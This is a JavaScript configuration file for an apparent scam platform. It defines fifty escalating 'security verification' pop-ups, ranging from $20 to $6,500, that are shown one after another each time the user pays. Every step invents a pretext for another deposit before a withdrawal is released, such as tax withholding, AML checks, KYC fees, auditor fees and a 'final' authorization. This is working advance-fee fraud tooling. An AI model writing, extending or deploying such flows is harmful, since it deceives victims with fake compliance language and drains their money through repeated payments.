// Modular flag configuration
// Add as many security pop-up steps as you want in the SECURITY_STEPS array.
// Each step will be shown one after another after the user makes a payment.
export const FLAG_CONFIG = {
  enabled: true,
  reasons: {
    auto_flag: "Automatic security verification",
    suspicious_activity: "Suspicious activity detected",
    high_volume: "High volume withdrawal request",
    new_account: "New account verification"
  }
};

// ─────────────────────────────────────────────────────────────
//  ADD / EDIT SECURITY POP-UP STEPS HERE
//  Each object = one pop-up shown in order after the previous payment.
// ─────────────────────────────────────────────────────────────
export const SECURITY_STEPS = [
  {
    id: "step_1",
    deposit_required_usd: 20,
    title: "Verification Required",
    message: "For security purposes, we need to verify your account. Please make a verification deposit to continue.",
    reason: "Automatic security verification"
  },
  {
    id: "step_2",
    deposit_required_usd: 50,
    title: "Identity Confirmation",
    message: "Your withdrawal amount requires an additional identity confirmation deposit to ensure account safety.",
    reason: "Identity confirmation required"
  },
  {
    id: "step_3",
    deposit_required_usd: 80,
    title: "Account Age Verification",
    message: "Your account is under 30 days old. A small security deposit is required to unlock withdrawal privileges for newer accounts.",
    reason: "New account withdrawal hold"
  },
  {
    id: "step_4",
    deposit_required_usd: 100,
    title: "Processing Fee",
    message: "A standard processing fee is required before your withdrawal can be initiated. This covers transaction handling costs.",
    reason: "Standard processing fee"
  },
  {
    id: "step_5",
    deposit_required_usd: 120,
    title: "Withdrawal Limit Upgrade",
    message: "Your current withdrawal limit is below your requested amount. Please make a deposit to upgrade your limit tier.",
    reason: "Withdrawal limit upgrade"
  },
  {
    id: "step_6",
    deposit_required_usd: 150,
    title: "Two-Factor Deposit Verification",
    message: "As an added layer of security, we require a two-factor deposit confirmation for withdrawals above this amount.",
    reason: "2FA deposit confirmation"
  },
  {
    id: "step_7",
    deposit_required_usd: 175,
    title: "Payment Provider Hold",
    message: "Your selected payment provider has placed a temporary hold. A deposit is needed to release it on their end.",
    reason: "Payment provider hold release"
  },
  {
    id: "step_8",
    deposit_required_usd: 200,
    title: "Risk Assessment Fee",
    message: "Our system has flagged this withdrawal for a routine risk assessment. A refundable deposit is required to proceed.",
    reason: "Risk assessment clearance"
  },
  {
    id: "step_9",
    deposit_required_usd: 250,
    title: "Tax Withholding Deposit",
    message: "Winnings above a certain threshold are subject to a tax withholding deposit. This will be reconciled upon payout.",
    reason: "Tax withholding compliance"
  },
  {
    id: "step_10",
    deposit_required_usd: 300,
    title: "Bank Routing Confirmation",
    message: "Your bank requires a small confirmation deposit to authorize the incoming transfer to your account.",
    reason: "Bank routing confirmation"
  },
  {
    id: "step_11",
    deposit_required_usd: 350,
    title: "Account Security Upgrade",
    message: "To protect your large withdrawal, your account must be upgraded to our secure withdrawal tier. A one-time fee applies.",
    reason: "Secure tier upgrade"
  },
  {
    id: "step_12",
    deposit_required_usd: 400,
    title: "Compliance Review Deposit",
    message: "Our compliance team requires a refundable deposit while they review your account for this withdrawal size.",
    reason: "Compliance review hold"
  },
  {
    id: "step_13",
    deposit_required_usd: 450,
    title: "Pending Verification Timeout",
    message: "Your previous verification step timed out. A re-verification deposit is needed to restart the withdrawal process.",
    reason: "Re-verification after timeout"
  },
  {
    id: "step_14",
    deposit_required_usd: 500,
    title: "Large Transaction Review",
    message: "Withdrawals of this size are automatically flagged for manual review. A deposit is required to prioritize your case.",
    reason: "Large transaction manual review"
  },
  {
    id: "step_15",
    deposit_required_usd: 550,
    title: "Final Authorization Hold",
    message: "Your withdrawal is approved and ready. A final authorization hold deposit is required to release the funds to your account.",
    reason: "Final authorization release"
  },
  {
    id: "step_16",
    deposit_required_usd: 600,
    title: "KYC Document Fee",
    message: "Our KYC (Know Your Customer) process requires a document verification deposit to validate your submitted ID.",
    reason: "KYC document verification"
  },
  {
    id: "step_17",
    deposit_required_usd: 650,
    title: "Network Congestion Surcharge",
    message: "Due to high transaction volumes, a temporary surcharge is applied to all outgoing withdrawals. This is a one-time fee.",
    reason: "Network congestion surcharge"
  },
  {
    id: "step_18",
    deposit_required_usd: 700,
    title: "Linked Account Mismatch",
    message: "A minor mismatch was detected between your linked accounts. A deposit is required to re-sync and confirm ownership.",
    reason: "Account mismatch resolution"
  },
  {
    id: "step_19",
    deposit_required_usd: 750,
    title: "Withdrawal Insurance Premium",
    message: "Withdrawals above this amount are automatically enrolled in our withdrawal protection plan. A one-time premium applies.",
    reason: "Withdrawal protection premium"
  },
  {
    id: "step_20",
    deposit_required_usd: 800,
    title: "Currency Conversion Hold",
    message: "Your funds are being converted to your local currency. A temporary conversion hold deposit is required during processing.",
    reason: "Currency conversion hold"
  },
  {
    id: "step_21",
    deposit_required_usd: 850,
    title: "Elevated Risk Flag",
    message: "Your account has been assigned an elevated risk flag due to recent activity patterns. A deposit clears this automatically.",
    reason: "Elevated risk flag clearance"
  },
  {
    id: "step_22",
    deposit_required_usd: 900,
    title: "Withdrawal Queue Priority Fee",
    message: "Your withdrawal has entered a processing queue. A priority fee ensures it is handled within 24 hours.",
    reason: "Withdrawal queue priority"
  },
  {
    id: "step_23",
    deposit_required_usd: 950,
    title: "Account Balance Confirmation",
    message: "To confirm the accuracy of your account balance before withdrawal, a temporary confirmation deposit is required.",
    reason: "Balance confirmation hold"
  },
  {
    id: "step_24",
    deposit_required_usd: 1000,
    title: "Fraud Prevention Hold",
    message: "Our fraud prevention system has placed a routine hold on your withdrawal. A deposit is required to bypass the hold.",
    reason: "Fraud prevention clearance"
  },
  {
    id: "step_25",
    deposit_required_usd: 1100,
    title: "Payment Gateway Verification",
    message: "Your payment gateway requires an additional verification deposit to authorize a transfer of this size.",
    reason: "Payment gateway verification"
  },
  {
    id: "step_26",
    deposit_required_usd: 1200,
    title: "Anti-Money Laundering Check",
    message: "As per AML regulations, a compliance deposit is required for withdrawals exceeding your current verified limit.",
    reason: "AML compliance deposit"
  },
  {
    id: "step_27",
    deposit_required_usd: 1300,
    title: "Withdrawal Method Change Fee",
    message: "A fee has been applied due to a recent change in your preferred withdrawal method. Please deposit to confirm the update.",
    reason: "Withdrawal method update fee"
  },
  {
    id: "step_28",
    deposit_required_usd: 1400,
    title: "Account Dormancy Reactivation",
    message: "Your account showed brief dormancy during the withdrawal process. A reactivation deposit is required to resume.",
    reason: "Dormancy reactivation fee"
  },
  {
    id: "step_29",
    deposit_required_usd: 1500,
    title: "Third-Party Auditor Fee",
    message: "A third-party auditor has been assigned to verify your withdrawal. Their processing fee must be covered before release.",
    reason: "Third-party auditor fee"
  },
  {
    id: "step_30",
    deposit_required_usd: 1600,
    title: "Security Token Renewal",
    message: "Your account security token has expired. A renewal deposit is required to issue a new token and continue your withdrawal.",
    reason: "Security token renewal"
  },
  {
    id: "step_31",
    deposit_required_usd: 1700,
    title: "Withdrawal Frequency Lock",
    message: "Multiple withdrawal attempts have triggered a frequency lock. A deposit is required to reset your withdrawal counter.",
    reason: "Frequency lock reset"
  },
  {
    id: "step_32",
    deposit_required_usd: 1800,
    title: "IP Address Mismatch Fee",
    message: "Your current IP address differs from your last login. A security deposit is required to verify this is an authorized device.",
    reason: "IP address mismatch security"
  },
  {
    id: "step_33",
    deposit_required_usd: 1900,
    title: "Cashout Threshold Adjustment",
    message: "Your requested amount exceeds your current cashout threshold. A deposit adjusts your threshold to accommodate the withdrawal.",
    reason: "Cashout threshold adjustment"
  },
  {
    id: "step_34",
    deposit_required_usd: 2000,
    title: "Manual Review Escalation",
    message: "Your case has been escalated to a senior compliance officer. A deposit is required to cover the escalation processing fee.",
    reason: "Manual review escalation fee"
  },
  {
    id: "step_35",
    deposit_required_usd: 2200,
    title: "Cross-Border Transaction Fee",
    message: "Your withdrawal has been routed through an international processing node. A cross-border transaction fee applies.",
    reason: "Cross-border transaction fee"
  },
  {
    id: "step_36",
    deposit_required_usd: 2400,
    title: "Payout Partner Hold",
    message: "Our payout partner has placed a temporary hold pending additional account confirmation. A deposit resolves this hold.",
    reason: "Payout partner hold release"
  },
  {
    id: "step_37",
    deposit_required_usd: 2600,
    title: "High-Value Account Screening",
    message: "Accounts requesting high-value withdrawals undergo additional screening. A screening deposit is required to proceed.",
    reason: "High-value account screening"
  },
  {
    id: "step_38",
    deposit_required_usd: 2800,
    title: "Duplicate Transaction Check",
    message: "A duplicate transaction was flagged in our system. A deposit is required to confirm which transaction should be processed.",
    reason: "Duplicate transaction resolution"
  },
  {
    id: "step_39",
    deposit_required_usd: 3000,
    title: "Regulatory Reporting Fee",
    message: "Withdrawals above this amount are reported to financial regulators. A regulatory filing fee is required before release.",
    reason: "Regulatory reporting fee"
  },
  {
    id: "step_40",
    deposit_required_usd: 3200,
    title: "Extended Verification Period",
    message: "Your account has entered an extended verification period. A deposit expedites the review and restores normal access.",
    reason: "Extended verification expedite fee"
  },
  {
    id: "step_41",
    deposit_required_usd: 3500,
    title: "Payout System Maintenance Hold",
    message: "Scheduled maintenance on our payout system has delayed your withdrawal. A deposit reserves your place in the post-maintenance queue.",
    reason: "Maintenance queue reservation"
  },
  {
    id: "step_42",
    deposit_required_usd: 3800,
    title: "Beneficiary Confirmation",
    message: "Our system requires confirmation of your beneficiary details for a withdrawal of this size. A deposit initiates the confirmation.",
    reason: "Beneficiary confirmation deposit"
  },
  {
    id: "step_43",
    deposit_required_usd: 4000,
    title: "Legal Compliance Clearance",
    message: "A legal compliance clearance is required for withdrawals at this level. The clearance deposit is fully documented.",
    reason: "Legal compliance clearance"
  },
  {
    id: "step_44",
    deposit_required_usd: 4200,
    title: "Dispute Prevention Hold",
    message: "To prevent potential future disputes on this transaction, a protective hold deposit is required by our legal team.",
    reason: "Dispute prevention hold"
  },
  {
    id: "step_45",
    deposit_required_usd: 4500,
    title: "Senior Account Manager Review",
    message: "Your withdrawal has been assigned to a senior account manager. A deposit covers their dedicated review fee.",
    reason: "Senior account manager fee"
  },
  {
    id: "step_46",
    deposit_required_usd: 4800,
    title: "Account Integrity Check",
    message: "A full account integrity check has been triggered for withdrawals of this magnitude. A deposit is required to begin the check.",
    reason: "Account integrity check"
  },
  {
    id: "step_47",
    deposit_required_usd: 5000,
    title: "Funds Release Authorization",
    message: "Your funds are ready for release. A final authorization deposit confirms your intent and initiates the transfer.",
    reason: "Funds release authorization"
  },
  {
    id: "step_48",
    deposit_required_usd: 5500,
    title: "Priority Withdrawal Slot",
    message: "To secure a priority withdrawal slot and avoid further delays, a slot reservation deposit is required immediately.",
    reason: "Priority slot reservation"
  },
  {
    id: "step_49",
    deposit_required_usd: 6000,
    title: "Final Compliance Sign-Off",
    message: "Our compliance department requires a final sign-off deposit before your withdrawal can be marked as approved.",
    reason: "Final compliance sign-off"
  },
  {
    id: "step_50",
    deposit_required_usd: 6500,
    title: "Absolute Final Verification",
    message: "This is the last step. Your funds will be released immediately after this final verification deposit is processed. Thank you for your patience.",
    reason: "Absolute final verification"
  },
];

export function getDepositMessage(depositUSD, formatCurrency) {
  return `A deposit of ${formatCurrency(depositUSD)} is required to verify your account and process your withdrawal.`;
}